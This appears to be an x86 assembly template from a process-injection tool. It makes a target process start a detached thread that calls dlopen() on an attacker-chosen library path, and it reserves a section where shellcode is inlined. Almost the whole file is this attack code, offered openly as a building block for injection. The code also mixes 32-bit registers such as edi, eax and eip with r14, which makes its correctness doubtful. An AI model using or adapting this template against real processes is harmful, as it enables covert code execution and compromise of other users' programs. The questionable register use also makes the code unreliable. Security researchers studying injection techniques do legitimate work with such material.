# Threaded veesion of dlinject.s
# Same caveats as execute_precompiled_threaded.s

[FRAGMENT:asminject_libdl_dlopen.s:FRAGMENT]
[FRAGMENT:asminject_libpthread_pthread_create.s:FRAGMENT]
[FRAGMENT:asminject_libpthread_pthread_detach.s:FRAGMENT]
[FRAGMENT:asminject_libpthread_pthread_exit.s:FRAGMENT]

	jmp post_load_library

load_library:
	// BEGIN: call dlopen() against the specified library
	push r14
	lea edi, library_path[eip]
	call asminject_libdl_dlopen
	pop r14
	mov edi, 0
	call asminject_libpthread_pthread_exit
	// END: call dlopen()

post_load_library:
	lea eax, load_library[eip]
	mov edx, eax
	mov edi, arbitrary_read_write_data_address[eip]
	add edi, 0x1000		# don't overwrite anything important
	push edx
	push edi
	call asminject_libpthread_pthread_create
	pop edi
	pop edx
// detach the newly-created thread where the library has been loaded
	call asminject_libpthread_pthread_detach
	
[VARIABLE:POST_SHELLCODE_LABEL:VARIABLE]:
	
# inlined shellcode will go after this delimiter
SHELLCODE_SECTION_DELIMITER

library_path:
	.ascii "[VARIABLE:librarypath:VARIABLE]\0"
